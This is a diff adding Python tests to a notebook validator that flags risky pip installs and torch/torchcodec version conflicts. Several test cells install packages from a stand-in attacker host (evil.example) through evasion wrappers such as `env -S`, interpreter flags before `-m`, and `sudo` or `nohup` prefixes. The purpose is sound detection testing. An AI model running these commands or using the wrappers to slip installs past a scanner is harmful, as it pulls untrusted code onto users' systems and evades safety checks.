@@ -2784,3 +2784,112 @@ def test_a_dry_run_does_not_seed_the_resolved_set():
             '!pip install "torch==2.12.0"', colab, "nb.ipynb", 0
         )
     ] == ["R-INST-004"]
+
+
+def test_env_split_string_keeps_the_arguments_that_follow_it():
+    """`env -S 'cmd' ARG...` appends the trailing ARGs to what the split string produced.
+
+    That is how `#!/usr/bin/env -S perl -w` reaches `perl -w script.pl`. Dropping them left
+    `pip install` with no packages, so R-INST-001 saw an install of nothing and said nothing.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        '!env -S "pip install" git+https://evil.example/pkg.git',
+        "!env --split-string='pip install' git+https://evil.example/pkg.git",
+        '!env --split-string="pip install" git+https://evil.example/pkg.git',
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+    # The whole command inside the split string still works, and so does no split string.
+    assert [f.rule for f in nv.rule_inst_001_git_plus(
+        '!env -S "pip install git+https://evil.example/pkg.git"', "nb.ipynb", 0)] == ["R-INST-001"]
+    assert nv._strip_exec_prefixes(
+        "env -u PIP_INDEX_URL pip install x"
+    ) == ("pip install x", True)
+
+
+def test_interpreter_options_may_precede_the_module_flag():
+    """`python [option] ... [-m mod ...]` is the documented usage, so `-I` may sit before `-m`.
+
+    Requiring `-m` immediately after the interpreter meant `python -I -m pip install git+...`
+    matched no install rule at all, which is a bypass rather than a missed warning.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "!python -I -m pip install git+https://evil.example/pkg.git",
+        "!python -u -m pip install git+https://evil.example/pkg.git",
+        "!python3 -E -s -m pip install git+https://evil.example/pkg.git",
+        "!python -m pip install git+https://evil.example/pkg.git",
+        "!pip install git+https://evil.example/pkg.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+    # A bare word before `-m` is a script path, not an option, and runs no pip.
+    assert nv.PIP_LINE_RE.match("!python setup.py -m pip install x") is None
+
+
+def test_an_uninstall_removes_the_package_from_the_resolved_set():
+    """The cell deleted it, so the environment it leaves behind has no such package.
+
+    Ignoring `inv.action` kept the pin from the earlier install, and the rules that read the
+    resolved set then judged a package `pip uninstall` had already removed.
+    """
+    nv = _load_notebook_validator_module()
+    colab = {"torch": "2.11.0+cu128", "python": "3.12"}
+
+    cell = "!pip install peft==0.19 torchao==0.16\n!pip uninstall -y torchao"
+    resolved = nv.resolved_set(cell, colab)
+    assert resolved.get("torchao") is None
+    assert resolved.get("peft") == "0.19"
+    # A reinstall after the uninstall wins, and inherits no bound from before it.
+    assert nv.resolved_set(
+        "!pip install torchao==0.16\n!pip uninstall -y torchao\n!pip install torchao==0.17",
+        colab,
+    ).get("torchao") == "0.17"
+
+
+def test_a_bounded_window_on_an_absent_package_lands_on_its_newest_release():
+    """pip takes the newest release a bounded window admits, not its floor.
+
+    Reporting the floor as EXACT made `>=0.10,<0.12` read as 0.10 and R-INST-004 reject an
+    install that is compatible with the torch beside it.
+    """
+    nv = _load_notebook_validator_module()
+    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
+
+    cell = '!pip uninstall -y torchcodec\n!pip install "torchcodec>=0.10,<0.12"'
+    assert nv._effective_version(
+        cell, "torchcodec", colab["torchcodec"], nv._marker_environment(colab)
+    ) == ("0.11", True)
+    assert nv.rule_inst_004_torchcodec_torch(cell, colab, "nb.ipynb", 0) == []
+    # A floor with no ceiling still names only how low, never where it lands.
+    assert nv._effective_version(
+        '!pip uninstall -y torchcodec\n!pip install "torchcodec>=0.10"',
+        "torchcodec",
+        colab["torchcodec"],
+        nv._marker_environment(colab),
+    ) == ("0.10", False)
+
+
+def test_builtin_is_not_an_exec_prefix():
+    """`builtin pip install ...` is an error, not an install.
+
+    bash answers `builtin: pip: not a shell builtin` and runs nothing, so unwrapping it made
+    the replay report a version the cell can never have installed.
+    """
+    nv = _load_notebook_validator_module()
+    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
+
+    assert nv.rule_inst_004_torchcodec_torch(
+        '!builtin pip install "torch==2.12.0"', colab, "nb.ipynb", 0
+    ) == []
+    assert nv.rule_inst_001_git_plus(
+        "!builtin pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+    ) == []
+    # The prefixes that really do run the command after them are untouched.
+    for prefix in ("command", "exec", "nohup", "time", "sudo"):
+        assert nv._strip_exec_prefixes(f"{prefix} pip install x") == ("pip install x", True), prefix
